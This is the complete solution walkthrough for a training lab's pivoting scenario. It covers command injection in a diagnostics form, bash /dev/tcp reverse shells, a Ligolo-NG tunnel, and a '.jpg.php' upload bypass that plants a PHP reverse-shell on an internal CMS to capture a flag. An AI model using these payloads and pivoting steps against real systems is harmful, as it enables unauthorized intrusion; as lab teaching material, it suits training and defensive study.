# Scenario 01 — Solution Walkthrough

> **Spoiler Warning**
>
> This document contains the complete solution for Scenario 01 of the Enterprise Pivot Lab.

## Overview

Scenario 01 demonstrates an end-to-end attack against a segmented network.

The attacker begins on Kali with access only to the external lab network. WEB01 is compromised through a vulnerable web application, revealing a second network that Kali cannot access directly.

Ligolo-NG is then deployed through the WEB01 foothold to route traffic into the internal network. An internal web application on TARGET01 is enumerated and exploited, resulting in a second foothold and recovery of the scenario flag.

The completed attack path is:

```text
KALI
10.10.10.10
     |
     | LAB-EXT
     v
WEB01
10.10.10.20
172.16.10.10
     |
     | CORP-LAN
     v
TARGET01
172.16.10.20
```

Kali does not have a VirtualBox interface attached directly to `CORP-LAN`.

---

# 1. Starting Position

The attacker begins on Kali.

Known information:

```text
Kali:       10.10.10.10
WEB01:      10.10.10.20
```

The internal `172.16.10.0/24` network is not initially known to the attacker.

Verify the Kali interfaces:

```bash
ip -br addr
ip route
```

Kali should have an interface on:

```text
10.10.10.0/24
```

but no interface or route for:

```text
172.16.10.0/24
```

---

# 2. Enumerating WEB01

Begin by enumerating WEB01:

```bash
sudo nmap -Pn -sC -sV -p- 10.10.10.20
```

The scan reveals the OpsCheck web application.

Browse to the application or inspect it with `curl`:

```bash
curl http://10.10.10.20:8080/
```

The health endpoint can also be queried:

```bash
curl http://10.10.10.20:8080/health
```

A healthy deployment returns information identifying the service as OpsCheck.

---

# 3. Discovering Command Injection

OpsCheck contains a network diagnostics function that accepts an IPv4 address or hostname and performs a ping.

A normal input might be:

```text
10.10.10.10
```

Testing shell metacharacters reveals that the input is passed to a shell.

For example:

```text
127.0.0.1; id
```

The resulting output contains the normal ping results followed by the output of `id`.

Additional verification can be performed with:

```text
127.0.0.1; whoami
```

The injected commands execute as the unprivileged:

```text
opscheck
```

service account.

This confirms command injection on WEB01.

---

# 4. Enumerating WEB01 Through Command Injection

The command-execution primitive can be used to inspect WEB01's network configuration.

Submit:

```text
127.0.0.1; ip -br addr
```

and:

```text
127.0.0.1; ip route
```

WEB01 is revealed to be dual-homed.

Its important addresses are:

```text
LAB-EXT
10.10.10.20/24

CORP-LAN
172.16.10.10/24
```

This reveals the previously unknown:

```text
172.16.10.0/24
```

internal network.

Kali does not have a direct route to this network.

---

# 5. Obtaining a WEB01 Reverse Shell

On Kali, start a listener:

```bash
rlwrap nc -lvnp 4444
```

If `rlwrap` is unavailable:

```bash
nc -lvnp 4444
```

Submit the following payload through the vulnerable OpsCheck diagnostics field:

```text
127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
```

The Kali listener should receive a shell.

Verify the foothold:

```bash
whoami
id
hostname
pwd
```

The shell should execute as:

```text
opscheck
```

---

# 6. Upgrading the WEB01 Shell

A basic reverse shell can be upgraded using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Press:

```text
Ctrl-Z
```

On Kali:

```bash
stty raw -echo; fg
```

Press Enter if necessary, then inside the remote shell:

```bash
export TERM=xterm
export SHELL=/bin/bash
stty rows 40 columns 120
```

If the local terminal becomes corrupted after leaving the shell, restore it with:

```bash
reset
```

---

# 7. Confirming the Internal Network

From the WEB01 foothold:

```bash
ip -br addr
ip route
```

WEB01 should have connectivity to:

```text
172.16.10.0/24
```

Test the internal target:

```bash
ping -c 2 172.16.10.20
```

A successful response demonstrates that WEB01 can reach a host that Kali cannot directly access.

---

# 8. Starting Ligolo-NG

On Kali, start the Ligolo-NG proxy:

```bash
sudo ligolo-proxy -selfcert
```

Running the proxy with elevated privileges is required so Ligolo can create its TUN interface.

The proxy listens for agents on TCP port:

```text
11601
```

---

# 9. Staging the Ligolo Agent

On Kali, create a temporary staging directory:

```bash
mkdir -p /tmp/ligolo-stage
cp /usr/bin/ligolo-agent /tmp/ligolo-stage/
cd /tmp/ligolo-stage
```

Start a temporary HTTP server bound to Kali's LAB-EXT address:

```bash
python3 -m http.server 8000 --bind 10.10.10.10
```

From the WEB01 shell:

```bash
cd /tmp
curl http://10.10.10.10:8000/ligolo-agent -o ligolo-agent
chmod +x ligolo-agent
```

Verify the file exists:

```bash
ls -lh /tmp/ligolo-agent
```

---

# 10. Connecting WEB01 to the Ligolo Proxy

From WEB01:

```bash
/tmp/ligolo-agent \
  -connect 10.10.10.10:11601 \
  -ignore-cert
```

The Ligolo proxy console on Kali should report a new agent.

The agent should appear as:

```text
opscheck@Web01
```

In the Ligolo console:

```text
session
```

Select the WEB01 session.

Then inspect its interfaces:

```text
ifconfig
```

The important WEB01 networks should include:

```text
10.10.10.0/24
172.16.10.0/24
```

---

# 11. Creating the CORP-LAN Route

In the Ligolo console:

```text
autoroute
```

Select the WEB01 interface associated with:

```text
172.16.10.10/24
```

Create a new interface and name it:

```text
ligolo-web01
```

Start the tunnel when prompted.

On Kali, verify the TUN interface:

```bash
ip link show ligolo-web01
```

Verify the route:

```bash
ip route | grep 172.16.10
```

The important result is:

```text
172.16.10.0/24 dev ligolo-web01
```

Check Linux's routing decision:

```bash
ip route get 172.16.10.20
```

The result should contain:

```text
dev ligolo-web01
```

The displayed source address may be another Kali address. The important field is the selected `ligolo-web01` device.

---

# 12. Testing the Pivot

Kali should now be able to communicate with TARGET01 through WEB01.

Test ICMP:

```bash
ping -c 2 172.16.10.20
```

Then enumerate the internal target:

```bash
nmap -Pn -sV -p- 172.16.10.20
```

TARGET01 exposes services including:

```text
22/tcp    SSH
80/tcp    HTTP
```

The HTTP service is Apache.

---

# 13. Discovering Northstar CMS

Request the internal web application:

```bash
curl http://172.16.10.20/
```

Or browse to:

```text
http://172.16.10.20/
```

The application identifies itself as:

```text
Northstar CMS 2.4.1
```

Northstar is an internal communications and publishing platform.

---

# 14. Enumerating Northstar

Basic content enumeration can be performed with `ffuf`:

```bash
ffuf \
  -u http://172.16.10.20/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,204,301,302,307,401,403
```

Interesting resources include:

```text
/admin/
/assets/
/media/
/README.txt
```

Inspect the deployment documentation:

```bash
curl http://172.16.10.20/README.txt
```

The file identifies several installed components, including:

```text
Northstar CMS       2.4.1
MediaTools          1.3
```

The deployment notes indicate that MediaTools is a legacy component retained for compatibility with the existing media library.

---

# 15. Investigating MediaTools

Browse to:

```text
http://172.16.10.20/media/
```

MediaTools provides a file-upload function.

The application claims to support:

```text
JPG
JPEG
PNG
GIF
PDF
```

Begin by testing the filter.

Create an unsupported file:

```bash
echo 'northstar upload test' > test.txt
```

Upload it:

```bash
curl -s \
  -F 'media=@test.txt' \
  http://172.16.10.20/media/ |
grep -E 'Upload|rejected|Media URL'
```

The application should reject the file.

Now create a file using an allowed extension:

```bash
cp test.txt test.jpg
```

Upload it:

```bash
curl -s \
  -F 'media=@test.jpg' \
  http://172.16.10.20/media/ |
grep -E 'Upload|rejected|Media URL'
```

The upload succeeds.

---

# 16. Discovering the Filename Validation Weakness

Test whether MediaTools validates the final filename extension or merely searches for an allowed extension somewhere in the filename.

Create a harmless PHP execution probe:

```bash
cat > probe.jpg.php <<'EOF'
<?php
echo "NORTHSTAR_PHP_EXECUTION_OK";
?>
EOF
```

Upload it:

```bash
curl -s \
  -F 'media=@probe.jpg.php' \
  http://172.16.10.20/media/ |
grep -E 'Upload|rejected|Media URL'
```

Despite ending in `.php`, the file is accepted because `.jpg` appears earlier in the filename.

Request the uploaded file:

```bash
curl http://172.16.10.20/uploads/probe.jpg.php
```

Successful exploitation returns:

```text
NORTHSTAR_PHP_EXECUTION_OK
```

This confirms that:

1. the filename validation can be bypassed;
2. the uploaded file is stored beneath the web root; and
3. Apache executes the uploaded file as PHP.

The attacker now has server-side code execution on TARGET01.

---

# 17. Understanding the Reverse-Connection Problem

A direct reverse-shell payload pointing to:

```text
10.10.10.10
```

does not work.

This is expected.

The Ligolo route allows **Kali to initiate connections into CORP-LAN**, but it does not automatically create a route from TARGET01 back to Kali's LAB-EXT address.

The current network relationship is:

```text
KALI
10.10.10.10
     |
     | LAB-EXT
     v
WEB01
10.10.10.20
172.16.10.10
     |
     | CORP-LAN
     v
TARGET01
172.16.10.20
```

TARGET01 can reach:

```text
172.16.10.10
```

on WEB01.

It cannot directly route to:

```text
10.10.10.10
```

on Kali.

The reverse connection therefore needs to be relayed through the Ligolo agent running on WEB01.

---

# 18. Creating a Ligolo Reverse Listener

Keep the WEB01 Ligolo session selected.

In the Ligolo console:

```text
listener_add --addr 0.0.0.0:4445 --to 127.0.0.1:4445 --tcp
```

Verify that the listener was actually created:

```text
listener_list
```

An active listener should appear with an agent listener address similar to:

```text
0.0.0.0:4445
```

and a proxy redirect address of:

```text
127.0.0.1:4445
```

This creates the following path:

```text
TARGET01
172.16.10.20
     |
     | TCP 172.16.10.10:4445
     v
WEB01
172.16.10.10
Ligolo agent listener
     |
     | Ligolo tunnel
     v
Kali Ligolo proxy
     |
     | 127.0.0.1:4445
     v
Kali netcat listener
```

The presence of the listener should always be confirmed with `listener_list` before attempting the callback.

---

# 19. Starting the Kali Listener

On Kali:

```bash
rlwrap nc -lvnp 4445
```

If `rlwrap` is unavailable:

```bash
nc -lvnp 4445
```

The listener remains on Kali even though TARGET01 will connect to WEB01.

Ligolo performs the relay between them.

---

# 20. Creating the TARGET01 Reverse-Shell Payload

Create a PHP payload on Kali:

```bash
cat > pivot-shell.jpg.php <<'EOF'
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/172.16.10.10/4445 0>&1'");
?>
EOF
```

Notice that the callback address is:

```text
172.16.10.10
```

This is WEB01's CORP-LAN address, not Kali's `10.10.10.10` address.

Upload the payload:

```bash
curl -s \
  -F 'media=@pivot-shell.jpg.php' \
  http://172.16.10.20/media/ |
grep -E 'Upload|rejected|Media URL'
```

The application should report:

```text
Upload completed.
```

---

# 21. Triggering the TARGET01 Shell

With the Kali listener running and the Ligolo listener confirmed active, request the uploaded payload:

```bash
curl http://172.16.10.20/uploads/pivot-shell.jpg.php
```

The HTTP request may remain open while the PHP process maintains the reverse shell.

The Kali listener should receive a connection.

Verify the new foothold:

```bash
whoami
id
hostname
pwd
```

The shell should execute as:

```text
www-data
```

This confirms successful compromise of TARGET01 through the internal pivot.

---

# 22. Enumerating TARGET01

Inspect the network configuration:

```bash
ip -br addr
ip route
```

TARGET01 should have:

```text
172.16.10.20/24
```

on CORP-LAN.

The final lab configuration does not provide TARGET01 with direct Internet access.

Perform basic local enumeration:

```bash
ls -la /
ls -la /opt
```

Search `/opt` for readable files:

```bash
find /opt -maxdepth 3 -type f -readable 2>/dev/null
```

This reveals:

```text
/opt/northstar/flag.txt
```

---

# 23. Recovering the Scenario Flag

Read the flag:

```bash
cat /opt/northstar/flag.txt
```

Recovering the flag completes Scenario 01.

The learner has now compromised an externally reachable service, used the resulting foothold to discover an internal network, established a pivot, compromised a service that was only reachable through that pivot, and handled the return path required for an internal reverse connection.

---

# 24. Completed Attack Path

```text
KALI
10.10.10.10
     |
     | enumerate 10.10.10.20
     v
WEB01
OpsCheck :8080
     |
     | command injection
     v
opscheck@Web01
     |
     | enumerate interfaces/routes
     v
Discover 172.16.10.0/24
     |
     | deploy Ligolo agent
     v
Ligolo-NG Pivot
     |
     | route via ligolo-web01
     v
CORP-LAN
172.16.10.0/24
     |
     | enumerate 172.16.10.20
     v
TARGET01
Northstar CMS :80
     |
     | enumerate application
     v
MediaTools 1.3
     |
     | filename validation bypass
     v
probe.jpg.php
     |
     | Apache PHP execution
     v
Server-Side Code Execution
     |
     | callback to WEB01 :4445
     v
Ligolo Reverse Listener
     |
     | relay to Kali :4445
     v
www-data@TARGET01
     |
     | local enumeration
     v
/opt/northstar/flag.txt
     |
     v
SCENARIO COMPLETE
```

---

# 25. Key Lessons

Scenario 01 demonstrates several concepts that become increasingly important when attacking segmented networks.

### Initial Access Is Not the End Goal

Compromising WEB01 provides access to the host, but the more important discovery is that WEB01 has access to another network.

The foothold becomes valuable because of **where the compromised system can communicate**.

### Pivoting Is a Routing Problem

Ligolo-NG allows Kali to route traffic through WEB01 into `172.16.10.0/24`.

Once the route exists, tools such as:

```text
curl
nmap
ssh
```

can operate against internal systems using normal IP addresses.

No `proxychains` configuration is required for this scenario.

### Internal Services Expand the Attack Surface

Northstar is inaccessible from Kali before the pivot.

After the route is established, TARGET01 exposes an entirely new application and vulnerability surface.

This demonstrates why network segmentation changes what an attacker can see without necessarily making internal services secure.

### File Validation Must Validate the Actual File

MediaTools accepts a filename because an allowed extension appears somewhere within it.

The application does not verify the final extension or safely prevent uploaded content from being interpreted as executable PHP.

The combination of weak validation and executable uploads results in server-side code execution.

### Routed Access Does Not Guarantee a Return Path

The Ligolo route allows Kali to initiate traffic toward TARGET01.

That does not mean TARGET01 can directly initiate traffic toward Kali's LAB-EXT address.

The reverse shell therefore requires a Ligolo listener on WEB01 to relay the connection back to Kali.

Understanding this distinction is essential when working across multiple network segments.

---

# 26. Final Scenario State

At the end of Scenario 01, the intended lab topology is:

```text
                    KALI
              10.10.10.10
                    |
                 LAB-EXT
              10.10.10.0/24
                    |
                  WEB01
              10.10.10.20
              172.16.10.10
                    |
                 CORP-LAN
             172.16.10.0/24
                    |
                TARGET01
              172.16.10.20
```

WEB01 and TARGET01 should not require temporary provisioning NAT adapters during normal lab operation.

TARGET01 hosts Northstar through the Apache service, which is enabled to start automatically after reboot.

The intended compromise chain is therefore reproducible without providing Kali with direct access to CORP-LAN.

---

# 27. Scenario Completion Checklist

A complete run should demonstrate all of the following:

```text
[ ] Enumerate WEB01 from Kali
[ ] Discover OpsCheck
[ ] Identify command injection
[ ] Obtain an opscheck shell
[ ] Discover WEB01's second interface
[ ] Identify 172.16.10.0/24
[ ] Deploy the Ligolo agent through the foothold
[ ] Establish the ligolo-web01 route
[ ] Reach 172.16.10.20 from Kali
[ ] Discover Northstar CMS
[ ] Enumerate Northstar resources
[ ] Identify MediaTools 1.3
[ ] Identify the filename-validation weakness
[ ] Upload a PHP execution probe
[ ] Confirm server-side PHP execution
[ ] Recognize that TARGET01 cannot directly callback to 10.10.10.10
[ ] Create a Ligolo listener on WEB01
[ ] Relay the reverse connection to Kali
[ ] Obtain www-data access on TARGET01
[ ] Enumerate TARGET01
[ ] Recover the scenario flag
```

When every step succeeds, Scenario 01 is complete.
